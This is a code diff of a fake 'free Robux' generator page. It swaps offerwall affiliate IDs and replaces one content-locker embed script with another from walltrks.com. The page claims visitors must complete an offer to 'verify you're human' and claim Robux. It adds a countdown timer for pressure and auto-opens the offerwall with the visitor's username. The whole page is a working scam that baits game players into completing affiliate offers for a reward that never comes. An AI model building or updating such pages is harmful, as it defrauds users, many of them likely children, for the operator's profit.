@@ -436,10 +436,10 @@ You can take this landing page but leave this message or website will be taken d
     <script type="text/javascript">
       var nPRaT_VPA_kWHJBc={"it":4595455,"key":"d30d6"};
     </script>
-    <!-- Fallback wrapper for the offerwall function -->
+    <!-- Fallback wrapper for the Taprain offerwall function -->
     <script>
       (function () {
-        var offerId = "69d9ef82e3605d1954a56ba0";
+        var offerId = "6ab7091a521d193660775d73";
         var fnName = "openOfferwall_" + offerId;
 
         if (typeof window[fnName] !== "function") {
@@ -459,8 +459,8 @@ You can take this landing page but leave this message or website will be taken d
         }
       })();
     </script>
-    <!-- Trackora locker embed -->
-    <script src="https://nvdshbtpmeji.trackora.link/embed/locker.js" data-locker="nvdshbtpmeji" data-src="https://nvdshbtpmeji.trackora.link/" async></script>
+    <!-- Taprain locker embed -->
+    <script src="https://walltrks.com/locker-embed.js" data-offerwall-id="6ab7091a521d193660775d73"></script>
   </head>
   <body>
     <div class="container">
@@ -562,7 +562,7 @@ You can take this landing page but leave this message or website will be taken d
           <p class="offers-subheader">Complete <strong>ONE</strong> offer below to verify you're human and claim your <span class="offer-highlight"><span id="offers-robux-amount">0</span> Robux</span> now!</p>
           <div class="offers-timer" id="offer-timer">05:00</div>
           <p class="offers-note">Complete verification quickly before your Robux expires!</p>
-          <button onclick="openOfferwall_69d9ef82e3605d1954a56ba0({ s1: selectedUsername })" style="background-color: green; color: white; border: none; border-radius: 8px; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer;">Claim Robux</button>
+          <button onclick="openOfferwall_6ab7091a521d193660775d73({ s1: selectedUsername })" style="background-color: green; color: white; border: none; border-radius: 8px; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer;">Claim Robux</button>
         </div>
       </div>
     </div>
@@ -687,11 +687,10 @@ You can take this landing page but leave this message or website will be taken d
         document.getElementById("final-step").style.display = "block";
         startCountdownTimer();
         
-        // This automatically opens the offerwall and passes the username
         setTimeout(function () {
           try {
-            if (typeof openOfferwall_69d9ef82e3605d1954a56ba0 === "function") {
-              openOfferwall_69d9ef82e3605d1954a56ba0({ s1: selectedUsername });
+            if (typeof openOfferwall_6ab7091a521d193660775d73 === "function") {
+              openOfferwall_6ab7091a521d193660775d73({ s1: selectedUsername });
             } else {
               console.warn("Offerwall function not ready yet.");
             }
@@ -751,4 +750,9 @@ You can take this landing page but leave this message or website will be taken d
       }
 
       function updateCarousel() {
-        const carousel = document.getElementById("testimonial
+        const carousel = document.getElementById("testimonial-carousel");
+        carousel.style.transform = `translateX(-${currentSlide * 100}%)`;
+        document.querySelectorAll(".carousel-dot").forEach((dot, index) => {
+          if (index === currentSlide) {
+            dot.classList.add("active");
+          } else {
